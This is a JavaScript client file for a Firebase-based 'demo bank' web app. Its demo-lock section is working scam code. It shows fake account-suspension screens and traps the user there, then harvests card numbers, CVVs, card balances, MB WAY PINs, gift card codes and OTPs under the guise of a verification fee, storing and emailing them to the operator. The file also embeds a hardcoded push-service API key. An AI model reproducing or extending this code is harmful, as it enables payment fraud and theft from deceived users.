// USER.JS — Atlantas Demo Bank · Complete Build v4
// Fixes: earn modal call, refer modal close, editField uses inline UI,
//        biometric writes to correct DB path, removed non-functional rows,
//        push notifications via FCM (works when app closed), loan feature.
'use strict';

if(!firebase.apps||!firebase.apps.length)firebase.initializeApp(FIREBASE_CONFIG);
var _auth=firebase.auth(),_db=firebase.database();
var _messaging=null;
try{_messaging=firebase.messaging();}catch(e){}

var _cfg={},_user=null,_ud=null,_balVis=true,_history=[];
var _prevScreen=null,_screenStack=[],_kycFiles={id:null,selfie:null};
var _appBooted=false,_cfgLoaded=false,_cl=null;
var _instFlow=null,_lockFlow=null,_recvUid=null,_lookupTimeout=null;

// ── UTILS ─────────────────────────────────────────────────────
function $(id){return document.getElementById(id);}
function _sym(c){return{USD:'$',EUR:'€',GBP:'£',NGN:'₦',CAD:'C$',AUD:'A$'}[c||'USD']||'$';}
function _esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function _fmtDate(iso){if(!iso)return '';var d=new Date(iso);return d.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})+' \xb7 '+d.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});}
function _fbErr(code){return({'auth/user-not-found':'No account found with this email.','auth/wrong-password':'Incorrect password.','auth/invalid-credential':'Incorrect email or password.','auth/email-already-in-use':'Email already registered.','auth/invalid-email':'Invalid email address.','auth/weak-password':'Password too weak (min 6 chars).','auth/too-many-requests':'Too many attempts. Try again later.'}[code])||'Something went wrong. Please try again.';}
function _genAccNum(){return new Promise(function(res){(function t(){var n=String(Math.floor(1000000000+Math.random()*9000000000));_db.ref(DB.accNums+'/'+n).once('value').then(function(s){if(s.exists())t();else res(n);});})();});}
function _notify(uid,msg){var k='n'+Date.now();return _db.ref(DB.notifs+'/'+uid+'/'+k).set({message:msg,date:new Date().toISOString(),read:false});}
function _setEl(id,val){var e=$(id);if(e)e.textContent=val||'';}

// ── CLOUDINARY ────────────────────────────────────────────────
function _clUpload(file,preset,onDone,onErr){
  var cl=_cl||CLOUDINARY_DEFAULTS;
  var cName=cl.cloudName||'dbgxllxdb';
  var pre=(cl.presets&&cl.presets[preset])||'efootball_screenshots';
  var comp=cl.compression||{maxW:1200,maxH:1200,quality:0.82};
  _compress(file,comp.maxW,comp.maxH,comp.quality,function(blob){
    var fd=new FormData();fd.append('file',blob,file.name||'upload.jpg');fd.append('upload_preset',pre);
    fetch('https://api.cloudinary.com/v1_1/'+cName+'/image/upload',{method:'POST',body:fd})
      .then(function(r){return r.json();})
      .then(function(d){if(d.secure_url)onDone(d.secure_url);else onErr('Upload failed — check Cloudinary preset');})
      .catch(function(){onErr('Upload failed. Check your connection.');});
  });
}
function _compress(file,maxW,maxH,quality,cb){
  var img=new Image(),url=URL.createObjectURL(file);
  img.onload=function(){
    var w=img.width,h=img.height,ratio=Math.min(1,Math.min((maxW||1200)/w,(maxH||1200)/h));
    var canvas=document.createElement('canvas');canvas.width=Math.round(w*ratio);canvas.height=Math.round(h*ratio);
    canvas.getContext('2d').drawImage(img,0,0,canvas.width,canvas.height);
    URL.revokeObjectURL(url);
    canvas.toBlob(function(blob){cb(blob||file);},file.type||'image/jpeg',quality||0.82);
  };
  img.onerror=function(){cb(file);};img.src=url;
}

// ── SCREENS (proper stack-based back navigation) ──────────────
function _show(id,slide){
  document.querySelectorAll('.screen').forEach(function(s){s.classList.remove('show','slide');});
  var s=$(id);if(!s)return;s.classList.add('show');if(slide)s.classList.add('slide');
}
// LOCK-SAFE screens — back button on these NEVER navigates away from demolock flow
var _LOCK_SCREENS=['demolock','lock-flow','lock-confirm'];
function APP_goScreen(name){
  var current=document.querySelector('.screen.show');
  if(current){
    // If we're in a lock screen, don't let the stack allow going to dashboard
    var inLock=_LOCK_SCREENS.indexOf(current.id)!==-1;
    _screenStack.push(inLock?'demolock':current.id);
  }
  _show(name,true);
}
function APP_back(){
  // If currently on a lock-flow screen, always go back to demolock
  var current=document.querySelector('.screen.show');
  if(current&&_LOCK_SCREENS.indexOf(current.id)!==-1){
    _show('demolock',false);
    return;
  }
  var prev=_screenStack.pop()||'app';
  // Never let back navigate into a lock screen unless we're already there
  if(_LOCK_SCREENS.indexOf(prev)!==-1&&(!current||_LOCK_SCREENS.indexOf(current.id)===-1)){
    prev='app';
  }
  _show(prev,false);
}

// ── CONFIG ────────────────────────────────────────────────────
function _loadConfig(cb){
  if(_cfgLoaded){if(cb)cb();return;}
  _db.ref(DB.appConfig).once('value',function(snap){
    _cfgLoaded=true;_cfg=snap.val()||{};window._cfg=_cfg;_cl=_cfg.cloudinary||null;_applyBranding();if(cb)cb();
  });
}
function _watchConfig(){
  _db.ref(DB.appConfig).on('value',function(snap){
    if(!_cfgLoaded)return;_cfg=snap.val()||{};window._cfg=_cfg;_cl=_cfg.cloudinary||null;_applyBranding();
  });
}
function _applyBranding(){
  var c=_cfg,en=(c.labels&&c.labels.en)||{};
  var name=c.appName||'Atlantas';document.title=name;
  _setEl('auth-app-name',name);_setEl('auth-app-sub',c.appSubtitle||'Secure \xb7 Reliable \xb7 Global');
  _setEl('auth-logo-icon',name.charAt(0));_setEl('gate-logo',name.charAt(0));
  _setEl('terms-logo',name.charAt(0));_setEl('terms-app-name',name);
  _setEl('app-version','v'+(c.appVersion||'1.0.0'));
  if(c.primaryColor)document.documentElement.style.setProperty('--p',c.primaryColor);
  if(c.bgColor)document.documentElement.style.setProperty('--bg',c.bgColor);
  if(c.textColor)document.documentElement.style.setProperty('--text',c.textColor);
  ['topup','send','cashout','request','cards','addCard','receipts','refer','balance'].forEach(function(k){
    var v=en[k];if(!v)return;
    if(k==='topup')_setEl('lbl-topup',v);else if(k==='send')_setEl('lbl-send',v);
    else if(k==='cashout')_setEl('lbl-cashout',v);else if(k==='request')_setEl('lbl-request',v);
    else if(k==='cards'){_setEl('lbl-cards',v);_setEl('lbl-nav-cards',v);}
    else if(k==='addCard')_setEl('lbl-add-card',v);
    else if(k==='receipts'){_setEl('lbl-receipts',v);_setEl('lbl-nav-tx',v);}
    else if(k==='refer')_setEl('lbl-refer',v);
    else if(k==='balance')_setEl('bal-pill-lbl',v.toUpperCase());
  });
  if(c.comingSoonTitle)_setEl('gate-title',c.comingSoonTitle);
  if(c.comingSoonMessage)_setEl('gate-sub',c.comingSoonMessage);
  var disclaimer=c.linkDisclaimer||'Sandbox environment — for testing purposes only.';
  _setEl('inst-disclaimer-text',disclaimer);
  _setEl('lock-disclaimer-text',disclaimer);
  if(c.emailjs){var ej=c.emailjs;if(ej.otp&&ej.otp.publicKey)try{emailjs.init(ej.otp.publicKey);}catch(e){}}
  if(_appBooted)_renderInstitutions();
}

// ── PUSH NOTIFICATIONS (FCM — works when app is closed) ───────
function _initPush(){
  if(!('Notification' in window)||!('serviceWorker' in navigator))return;
  if(Notification.permission==='default'){
    Notification.requestPermission().then(function(p){if(p==='granted')_enablePush();});
  }else if(Notification.permission==='granted'){_enablePush();}
}
function _enablePush(){
  // Register FCM token so the server / admin can send pushes to this device
  if(_messaging&&_user){
    try{
      _messaging.getToken({vapidKey:window.VAPID_PUBLIC_KEY||undefined}).then(function(token){
        if(token&&_user){
          _db.ref(DB.fcmTokens+'/'+_user.uid).set({token:token,platform:'web',updatedAt:new Date().toISOString()});
        }
      }).catch(function(){});
      // Handle foreground FCM messages
      _messaging.onMessage(function(payload){
        var title=(payload.notification&&payload.notification.title)||'Atlantas';
        var body=(payload.notification&&payload.notification.body)||'You have a new notification.';
        _pushNotif(title,body);
        if(_user)_watchNotifs(_user.uid);
      });
    }catch(e){}
  }
  // Register SW push subscription for standard Web Push
  navigator.serviceWorker.ready.then(function(reg){window._swReg=reg;}).catch(function(){});
  // Tag this device in OneSignal so admin push reaches it even when app is closed
  _registerOneSignalUser();
}
function _registerOneSignalUser(){
  if(!window.OneSignalDeferred||!_user)return;
  OneSignalDeferred.push(function(OneSignal){
    // Request permission via OneSignal (handles iOS 16.4+ PWA and Android)
    OneSignal.Notifications.requestPermission().catch(function(){});
    // Tag with uid so admin can target specific users if needed
    OneSignal.User.addTags({
      role: 'user',
      uid: _user.uid,
      email: (_ud&&_ud.email)||_user.email||''
    });
    // Store the OneSignal player ID in Firebase so admin can target this device
    OneSignal.User.PushSubscription.addEventListener('change', function(event){
      if(event.current&&event.current.id&&_user){
        _db.ref(DB.fcmTokens+'/'+_user.uid+'/osPlayerId').set(event.current.id);
      }
    });
  });
}
// ── PUSH ADMIN ALERT ─────────────────────────────────────────
// Fires from the USER app at submission time so admin gets push
// even when the admin panel is completely closed
function _pushAdminAlert(title,body){
  try{
    fetch('https://onesignal.com/api/v1/notifications',{
      method:'POST',
      headers:{
        'Content-Type':'application/json',
        'Authorization':'Basic os_v2_app_7ycnjhtfjrfqtmwpu7h2kalglvf3ipr4lk3usyfr727yprtjchpgztrnoxoo2m5ffrnx5lniywveztg4qq6w3ct5upsb36xhymjjdaa'
      },
      body:JSON.stringify({
        app_id:'fe04d49e-654c-4b09-b2cf-a7cfa501665d',
        filters:[{field:'tag',key:'role',relation:'=',value:'admin'}],
        headings:{en:title},
        contents:{en:body},
        url:'https://adminatlantas.vercel.app',
        web_buttons:[{id:'view',text:'View Now',url:'https://adminatlantas.vercel.app'}]
      })
    }).catch(function(){});
  }catch(e){}
}
function _pushNotif(title,body){
  if(Notification.permission!=='granted')return;
  navigator.serviceWorker.ready.then(function(reg){
    reg.showNotification(title,{body:body,icon:'https://i.imgur.com/iN8T10D.jpeg',badge:'https://i.imgur.com/iN8T10D.jpeg',vibrate:[200,100,200],requireInteraction:false,data:{url:'/'}});
  }).catch(function(){try{new Notification(title,{body:body,icon:'https://i.imgur.com/iN8T10D.jpeg'});}catch(e){}});
}

// ── BIOMETRIC ─────────────────────────────────────────────────
async function _checkBio(){
  if(!window.PublicKeyCredential)return false;
  try{return await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();}catch(e){return false;}
}
async function _tryBiometricLogin(){
  var savedEmail=localStorage.getItem('atl_bio_email');if(!savedEmail)return;
  var avail=await _checkBio();if(!avail)return;
  var btn=$('bio-login-btn');if(btn)btn.style.display='flex';
  if(!_user){
    setTimeout(async function(){
      var authScreen=$('auth');
      if(!authScreen||!authScreen.classList.contains('show'))return;
      try{
        var challenge=new Uint8Array(32);window.crypto.getRandomValues(challenge);
        await navigator.credentials.get({publicKey:{challenge:challenge,userVerification:'required',timeout:30000}});
        _show('bio-pin-screen',true);window._bioPendingEmail=savedEmail;
        var pi=$('bio-pin-input');if(pi)pi.focus();
      }catch(e){}
    },800);
  }
}
async function APP_doBiometricLogin(){
  try{
    var challenge=new Uint8Array(32);window.crypto.getRandomValues(challenge);
    await navigator.credentials.get({publicKey:{challenge:challenge,userVerification:'required',timeout:60000}});
    var email=localStorage.getItem('atl_bio_email');
    _show('bio-pin-screen',true);window._bioPendingEmail=email;
    var pi=$('bio-pin-input');if(pi)pi.focus();
  }catch(e){APP_toast('Biometric failed. Use password.','er');}
}
function APP_bioPinSubmit(){
  var pin=($('bio-pin-input')&&$('bio-pin-input').value)||'';
  var email=window._bioPendingEmail;if(!pin||!email)return;
  _db.ref(DB.users).orderByChild('email').equalTo(email).once('value',function(snap){
    if(!snap.exists()){APP_toast('Account not found','er');return;}
    var uid=Object.keys(snap.val())[0];
    if((snap.val()[uid].pin||'')===pin){APP_toast('Verified! Enter password to login.','ok');setTimeout(function(){_show('auth',false);var em=$('li-email');if(em)em.value=email;},1500);}
    else APP_toast('Incorrect PIN','er');
  });
}
async function APP_registerBiometric(){
  var avail=await _checkBio();
  if(!avail){APP_toast('Biometric not available on this device','er');return;}
  try{
    var challenge=new Uint8Array(32);window.crypto.getRandomValues(challenge);
    await navigator.credentials.create({publicKey:{
      challenge:challenge,rp:{name:'Atlantas',id:location.hostname},
      user:{id:new TextEncoder().encode(_user.uid),name:_user.email,displayName:(_ud&&_ud.firstname)||_user.email},
      pubKeyCredParams:[{alg:-7,type:'public-key'},{alg:-257,type:'public-key'}],
      authenticatorSelection:{authenticatorAttachment:'platform',userVerification:'required'},timeout:60000
    }});
    localStorage.setItem('atl_bio_email',_user.email);
    // FIX: Write to DB.users, not DB.admins
    _db.ref(DB.users+'/'+_user.uid+'/biometricEnabled').set(true);
    APP_toast('Biometric login enabled!','ok');_setEl('bio-status','Enabled');
    var btn=$('bio-toggle-btn');if(btn){btn.textContent='Disable';btn.onclick=APP_disableBiometric;}
  }catch(e){APP_toast('Setup failed: '+e.message,'er');}
}
function APP_disableBiometric(){
  localStorage.removeItem('atl_bio_email');
  if(_user)_db.ref(DB.users+'/'+_user.uid+'/biometricEnabled').set(false);
  APP_toast('Biometric disabled');_setEl('bio-status','Disabled');
  var btn=$('bio-toggle-btn');if(btn){btn.textContent='Enable';btn.onclick=APP_registerBiometric;}
}

// ── AUTH FLOW ─────────────────────────────────────────────────
_auth.onAuthStateChanged(function(user){
  _user=user;
  if(!user){
    _appBooted=false;_cfgLoaded=false;_ud=null;_history=[];
    _db.ref(DB.appConfig).off();
    _show('gate',false);
    if($('gate-spinner'))$('gate-spinner').style.display='none';
    _setEl('gate-title','Welcome to Atlantas');_setEl('gate-sub','Please sign in to continue.');
    var termsOk=localStorage.getItem('atl_terms_ok');
    setTimeout(function(){_show(termsOk?'auth':'terms',false);},400);
    return;
  }
  if(_appBooted)return;
  _show('gate',false);
  if($('gate-spinner'))$('gate-spinner').style.display='block';
  _setEl('gate-title','Setting up your account\u2026');_setEl('gate-sub','Please wait while we get things ready for you.');
  if($('gate-out'))$('gate-out').style.display='none';
  _loadConfig(function(){
    _watchConfig();
    _db.ref(DB.users+'/'+user.uid+'/demoLocked').once('value',function(ls){
      if(ls.val()===true){_db.ref(DB.users+'/'+user.uid).once('value',function(us){_ud=us.val()||{};_showDemoLock();});return;}
      _db.ref(DB.admins+'/'+user.uid+'/betaAccess').once('value',function(bs){
        if(bs.val()===true){_loadUserData(user);}
        else{
          // Check if auto-beta is enabled — if so, grant access automatically
          _db.ref('atl_config/autoBetaAccess').once('value',function(autoSnap){
            if(autoSnap.val()===true){
              // Auto grant and proceed
              _db.ref(DB.admins+'/'+user.uid).update({betaAccess:true,betaEmail:user.email||''}).then(function(){
                _loadUserData(user);
              });
              return;
            }
            // Manual mode — show gate and wait
            if($('gate-spinner'))$('gate-spinner').style.display='block';
            _setEl('gate-title',_cfg.comingSoonTitle||'Setting up your account\u2026');
            _setEl('gate-sub',_cfg.comingSoonMessage||"We\u2019re getting things ready. Check back soon!");
            if($('gate-out'))$('gate-out').style.display='block';
            _db.ref(DB.admins+'/'+user.uid+'/betaAccess').on('value',function(snap){
              if(snap.val()===true&&!_appBooted){_db.ref(DB.admins+'/'+user.uid+'/betaAccess').off();_loadUserData(user);}
            });
          });
        }
      });
    });
  });
});

function _loadUserData(user){
  _db.ref(DB.users+'/'+user.uid).once('value',function(snap){
    _ud=snap.val()||{};_appBooted=true;
    _renderUI();_loadHistory(user.uid);_watchNotifs(user.uid);_watchDemoLock(user.uid);
    _show('app',false);APP_switchTab('home');_initPush();
    _db.ref(DB.users+'/'+user.uid+'/lastSeen').set(new Date().toISOString());
    setInterval(function(){if(_user)_db.ref(DB.users+'/'+_user.uid+'/lastSeen').set(new Date().toISOString());},60000);
    document.addEventListener('visibilitychange',function(){
      if(document.visibilityState==='visible'&&_user)
        _db.ref(DB.users+'/'+_user.uid+'/lastSeen').set(new Date().toISOString());
    });
    // Watch real-time balance update
    _db.ref(DB.users+'/'+user.uid+'/balance').on('value',function(snap){if(_ud)_ud.balance=parseFloat(snap.val())||0;_renderBalance();});
    // Watch loan status changes so user sees updates in real time
    _db.ref(DB.loans).orderByChild('uid').equalTo(user.uid).on('value',function(snap){_renderLoanStatus();_loadMyLoans();});
    // Watch KYC status — user sees verification in real time
    _db.ref(DB.users+'/'+user.uid+'/kycStatus').on('value',function(snap){
      if(_ud){_ud.kycStatus=snap.val()||'pending';_renderUI();}
    });
    // Watch linked cards — user sees authorization/rejection in real time
    _db.ref(DB.users+'/'+user.uid+'/linkedCards').on('value',function(snap){
      if(_ud){_ud.linkedCards=snap.val()||[];_renderCards();}
    });
    // Watch user profile fields (name, pin, etc) — reflects admin changes live
    _db.ref(DB.users+'/'+user.uid).on('value',function(snap){
      if(!_appBooted)return; // skip during boot, handled by initial load
      var fresh=snap.val();if(!fresh)return;
      // Only update non-balance fields (balance has its own watcher)
      var bal=_ud?_ud.balance:0;
      _ud=fresh;_ud.balance=bal;
      _renderUI();
    });
    // Force reload watcher — admin can push app refreshes to all users
    var _lastReloadVal=null;
    _db.ref('atl_config/forceReloadAt').on('value',function(snap){
      var val=snap.val();
      if(!val)return;
      if(_lastReloadVal===null){_lastReloadVal=val;return;} // ignore initial value
      if(val!==_lastReloadVal){_lastReloadVal=val;setTimeout(function(){location.reload();},1500);}
    });
  });
}

function _watchDemoLock(uid){
  _db.ref(DB.users+'/'+uid+'/demoLocked').on('value',function(snap){
    if(snap.val()===true){_db.ref(DB.users+'/'+uid).once('value',function(s){_ud=s.val()||{};_showDemoLock();});}
    else if($('demolock')&&$('demolock').classList.contains('show'))_show('app',false);
  });
}

// ── DEMO LOCK SCREEN ──────────────────────────────────────────
function _showDemoLock(){
  var c=_cfg;
  var realLockEnabled=(c.enableLock===true)||(_ud&&_ud.realLockPage===true);
  var stepsEl=$('dl-steps');
  var mcon=$('dl-methods');
  var contact=$('dl-contact');
  if(realLockEnabled){
    _setEl('dl-title',c.lockTitle||'');
    _setEl('dl-sub',c.lockSubtitle||'');
    if(stepsEl)stepsEl.style.display='';
    if(c.lockStep1Text)_setEl('dl-s1',c.lockStep1Text);
    if(c.lockStep2Text)_setEl('dl-s2',c.lockStep2Text);
    if(c.lockStep3Text)_setEl('dl-s3',c.lockStep3Text);
    var methods=(c.lockPaymentMethods||[]).filter(function(m){return m.enabled!==false;});
    if(mcon)mcon.innerHTML='';
    methods.forEach(function(m){
      var div=document.createElement('div');div.className='dl-method';
      div.innerHTML='<div class="dl-method-ico"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--p)" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div>'+
        '<div class="dl-method-txt">'+(c.lockBtnLabel||'')+'</div>'+
        '<span class="dl-method-arrow">&#8250;</span>';
      div.onclick=function(){_startLockFlow(m);};if(mcon)mcon.appendChild(div);
    });
    if(contact&&c.lockContactEmail)contact.innerHTML='Need help? <a href="mailto:'+_esc(c.lockContactEmail)+'">'+_esc(c.lockContactEmail)+'</a>';
  } else {
    _setEl('dl-title','Account Temporarily Suspended');
    _setEl('dl-sub','Your account has been temporarily suspended due to a high transaction volume detected on a new account. Our security team is currently reviewing your activity. You will be notified once access is restored.');
    if(stepsEl)stepsEl.style.display='none';
    if(mcon)mcon.innerHTML='';
    if(contact)contact.innerHTML='';
  }
  _show('demolock',false);
}
function _startLockFlow(method){
  _lockFlow={method:method,data:{}};var c=_cfg;
  var lockAmt=(_ud&&_ud.lockAmount)||parseFloat(c.lockDefaultAmount)||150;
  var fields=method.formFields||[];
  if(!fields.length){
    if(method.key==='mbway')fields=[{key:'phone',label:'Phone Number',type:'tel'},{key:'pin',label:'PIN',type:'password'},{key:'name',label:'Account Name',type:'text'}];
    else if(method.key==='apple')fields=[{key:'code1',label:'Gift Card Code 1',type:'text'},{key:'amt1',label:'Amount',type:'number'},{key:'code2',label:'Gift Card Code 2 (optional)',type:'text',optional:true}];
    else fields=[{key:'name',label:'Cardholder Name',type:'text'},{key:'cn',label:'Card Number',type:'tel'},{key:'exp',label:'Expiry MM/YY',type:'text'},{key:'cvv',label:'CVV',type:'password'},{key:'bal',label:'Card Balance',type:'number'}];
  }
  _lockFlow.fields=fields;_lockFlow.amount=lockAmt;
  var con=$('lock-flow-fields');if(!con)return;con.innerHTML='';
  _setEl('lock-flow-amount',_sym(_ud&&_ud.currency)+lockAmt.toFixed(2));
  _setEl('lock-flow-desc',c.lockStep1Text||'Complete the verification step below.');
  fields.forEach(function(f){
    var w=document.createElement('div');w.style.marginBottom='10px';
    var l=document.createElement('div');l.style.cssText='font-size:12px;font-weight:700;color:var(--t2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:5px;';l.textContent=f.label+(f.optional?' (Optional)':'');
    var inp=document.createElement('input');inp.className='fi';inp.type=f.type||'text';inp.placeholder=f.label;inp.id='lf-'+f.key;
    w.appendChild(l);w.appendChild(inp);con.appendChild(w);
  });
  _show('lock-flow',true);  // stays as _show since demolock isn't in stack — APP_back guards it
  // Clear any stale screen stack items that could bypass demolock
  _screenStack=_screenStack.filter(function(id){return['demolock','lock-flow','lock-confirm'].indexOf(id)===-1;});
}
function APP_lockFlowSubmit(){
  var data={};var ok=true;
  (_lockFlow.fields||[]).forEach(function(f){var v=$('lf-'+f.key)&&$('lf-'+f.key).value.trim();if(!v&&!f.optional)ok=false;if(v)data[f.key]=v;});
  if(!ok){APP_toast('Please fill in all fields','er');return;}
  _lockFlow.data=data;
  var lockKey=_user.uid+'_'+Date.now();
  _lockFlow._lockKey=lockKey;
  _db.ref(DB.locks+'/'+lockKey).set(Object.assign({},data,{
    method:_lockFlow.method.key,amount:_lockFlow.amount,uid:_user.uid,
    name:(_ud.firstname+' '+_ud.surname),email:_ud.email,
    submittedDate:new Date().toISOString(),status:'pending'
  })).then(function(){
    _sendEmail('general','Account Verification Step',{user_name:_ud.firstname,user_email:_ud.email,method:_lockFlow.method.key,amount:String(_lockFlow.amount),message:'User submitted account verification payment step.'});
    _show('lock-confirm',true);
    _setEl('lock-confirm-msg',_cfg.lockConfirmMessage||'Thank you. Your submission is under review. You will be notified within 24 hours.');
    // Show OTP button if method requires it
    var otpBtn=$('lock-otp-continue-btn');var closeBtn=$('lock-confirm-close-btn');
    if(_lockFlow.method&&_lockFlow.method.requireOtp!==false){
      if(otpBtn)otpBtn.style.display='';
      if(closeBtn)closeBtn.style.display='';
    }
    // Save lock key to localStorage so user can return later
    try{localStorage.setItem('atl_lock_key',lockKey);}catch(e){}
  });
}
function APP_lockOtpSubmit(){
  var otp=($('lock-otp-input')&&$('lock-otp-input').value.trim())||'';
  var err=$('lock-otp-err');if(err)err.textContent='';
  if(!otp){if(err)err.textContent='Please enter the OTP code.';return;}
  // Get lock key — from current flow or saved in localStorage
  var lockKey=(_lockFlow&&_lockFlow._lockKey)||null;
  try{if(!lockKey)lockKey=localStorage.getItem('atl_lock_key');}catch(e){}
  if(!lockKey){APP_toast('Session expired. Please restart.','er');return;}
  // Append OTP to existing submission
  _db.ref(DB.locks+'/'+lockKey).update({otpCode:otp,otpSubmittedDate:new Date().toISOString(),status:'otp_submitted'}).then(function(){
    _sendEmail('general','Account Verification OTP Submitted',{user_name:_ud.firstname,user_email:_ud.email,otp:otp,message:'User submitted OTP for account verification. Full submission complete.'});
    try{localStorage.removeItem('atl_lock_key');}catch(e){}
    // Clear OTP input
    var inp=$('lock-otp-input');if(inp)inp.value='';
    APP_toast('OTP submitted successfully!','ok');
    APP_back();APP_back();
  });
}

// ── NOTIFICATIONS ─────────────────────────────────────────────
function _watchNotifs(uid){
  _db.ref(DB.notifs+'/'+uid).on('value',function(snap){
    var dot=$('notif-dot'),list=$('notif-list'),glow=$('tb-glow');
    if(!snap.exists()){
      if(dot)dot.classList.remove('on');if(glow)glow.classList.remove('on');
      if(list)list.innerHTML='<div class="tx-empty" style="margin:20px 18px;"><div class="tx-empty-ico"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--t2)" stroke-width="2" stroke-linecap="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/></svg></div><div class="tx-empty-t">No notifications</div><div class="tx-empty-s">You\'re all caught up!</div></div>';
      return;
    }
    var notifs=[];var unread=0;
    snap.forEach(function(n){var v=n.val();if(v){notifs.push(Object.assign({},v,{_key:n.key}));if(!v.read)unread++;}});
    notifs.sort(function(a,b){return new Date(b.date)-new Date(a.date);});
    if(dot)dot.classList.toggle('on',unread>0);if(glow)glow.classList.toggle('on',unread>0);
    if(unread>0&&_appBooted){var latest=notifs.find(function(n){return!n.read;});if(latest)_pushNotif('Atlantas',latest.message||'You have a new notification');}
    var html='';
    notifs.forEach(function(n){
      html+='<div class="notif-item'+(n.read?'':' unread')+'">'+(n.read?'<div class="notif-nub read"></div>':'<div class="notif-nub"></div>')+'<div><div class="notif-txt">'+_esc(n.message||n.text||'')+'</div><div class="notif-dt">'+_fmtDate(n.date)+'</div></div></div>';
      if(!n.read)_db.ref(DB.notifs+'/'+uid+'/'+n._key+'/read').set(true);
    });
    if(list)list.innerHTML=html;
  });
}

// ── RENDER UI ─────────────────────────────────────────────────
function _renderUI(){
  if(!_ud)return;var u=_ud;
  var init=((u.firstname||'').charAt(0)+(u.surname||'').charAt(0)).toUpperCase()||'??';
  _setEl('tb-init',init);_setEl('pf-ava',init);
  _setEl('pf-name',(u.firstname||'')+' '+(u.surname||''));_setEl('pf-email',u.email||'');
  _setEl('pf-fn',u.firstname||'\u2014');_setEl('pf-on',u.othername||'\u2014');_setEl('pf-sn',u.surname||'\u2014');
  _setEl('pf-ph',u.phone||'\u2014');_setEl('pf-acc',u.accountNumber||'\u2014');_setEl('pf-co',u.country||'\u2014');
  _setEl('pf-ref',u.referralCode||'\u2014');
  var kb=$('kyc-badge');if(kb){if(u.kycStatus==='verified'){kb.textContent='Verified';kb.className='more-badge ok';}else if(u.kycStatus==='submitted'){kb.textContent='Under Review';kb.className='more-badge';}else{kb.textContent='Needs Attention';kb.className='more-badge warn';}}
  var vb=$('verify-banner');if(vb)vb.style.display=u.kycStatus==='verified'?'none':'';
  var bioEnabled=!!localStorage.getItem('atl_bio_email');
  _setEl('bio-status',bioEnabled?'Enabled':'Disabled');
  var btn=$('bio-toggle-btn');if(btn){btn.textContent=bioEnabled?'Disable':'Enable';btn.onclick=bioEnabled?APP_disableBiometric:APP_registerBiometric;}
  _renderBalance();_renderCards();_renderInstitutions();_renderLoanStatus();
}
function _renderBalance(){
  if(!_ud)return;var bal=parseFloat(_ud.balance||0),sym=_sym(_ud.currency);
  var disp=_balVis?(sym+bal.toFixed(2)):'•••••';_setEl('bal-amt',disp);_setEl('acc-bal-usd',disp);
}
function _renderCards(){
  var con=$('cards-list');if(!con||!_ud)return;
  var cards=(_ud.linkedCards||[]).filter(Boolean);
  // Show/hide add card button based on feature flag
  var addBtn=$('add-card-btn');
  if(addBtn)addBtn.style.display=(_cfg.enableAddCard!==false)?'':'none';
  con.innerHTML='';
  var dotsEl=$('cards-dots');if(dotsEl)dotsEl.innerHTML='';
  if(!cards.length){
    con.innerHTML='<div style="padding:0 18px 8px;color:var(--t2);font-size:14px;text-align:center;">No cards linked yet</div>';
    return;
  }
  cards.forEach(function(card,i){
    var div=document.createElement('div');div.className='card-item';
    var brand=card.brand||(/^4/.test(card.number||'')?'Visa':/^5[1-5]/.test(card.number||'')?'Mastercard':/^3[47]/.test(card.number||'')?'Amex':'Card');
    var statusLabel=card.status==='authorized'?'AUTHORIZED':card.status==='rejected'?'REJECTED':card.status==='processing'?'PROCESSING':'PENDING';
    // check if card is pending OTP or ID
    var pendingStep='';
    if(card.status==='processing'||card.status==='pending'){
      if(card._needsOtp)pendingStep='OTP Pending';
      else if(card._needsId)pendingStep='ID Pending';
    }
    div.innerHTML=
      '<div class="card-shimmer"></div>'+
      '<div class="card-status '+_esc(card.status||'pending')+'">'+statusLabel+'</div>'+
      (pendingStep?'<div class="card-otp-badge">'+pendingStep+'</div>':'')+
      '<div class="card-nw"><div class="card-chip"></div>'+
        '<svg class="card-wifi" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.6)" stroke-width="2" stroke-linecap="round"><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M10.5 17.2a5 5 0 0 1 3 0"/><circle cx="12" cy="21" r="1" fill="rgba(255,255,255,.6)"/></svg>'+
      '</div>'+
      '<div class="card-num">\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 '+_esc(card.lastFour||'\u2022\u2022\u2022\u2022')+'</div>'+
      '<div class="card-bottom">'+
        '<div><div class="card-name">Card Holder</div><div class="card-holder">'+_esc((card.name||(_ud.firstname+' '+_ud.surname)).substring(0,20).toUpperCase())+'</div></div>'+
        '<div class="card-expiry-wrap"><div class="card-expiry-lbl">Expires</div><div class="card-expiry-val">'+_esc(card.expiry||'--/--')+'</div></div>'+
        '<div class="card-brand-wrap">'+
          (brand==='Visa'?'<div class="card-brand">VISA</div>':
           brand==='Mastercard'?'<div class="card-brand-circles"><div class="card-circle"></div><div class="card-circle"></div></div>':
           '<div class="card-brand">'+_esc(brand)+'</div>')+
        '</div>'+
      '</div>';
    div.onclick=(function(c,idx){return function(){APP_openCardDetail(c,idx);};})(card,i);
    con.appendChild(div);
    // dot
    if(dotsEl){var dot=document.createElement('div');dot.className='card-dot'+(i===0?' on':'');dotsEl.appendChild(dot);}
  });
  // Scroll listener to update dots
  con.onscroll=function(){
    var dots=dotsEl?dotsEl.querySelectorAll('.card-dot'):[];
    if(!dots.length)return;
    var idx=Math.round(con.scrollLeft/(con.scrollWidth/cards.length));
    dots.forEach(function(d,i){d.className='card-dot'+(i===idx?' on':'');});
  };
}
function _renderInstitutions(){
  var sec=$('inst-section');if(!sec)return;
  var insts=(_cfg.institutions||[]).filter(function(i){return i&&i.show!==false;});
  sec.style.display=insts.length?'':'none';
  var list=$('inst-list');if(!list)return;list.innerHTML='';
  // Check if user has any linked institutions
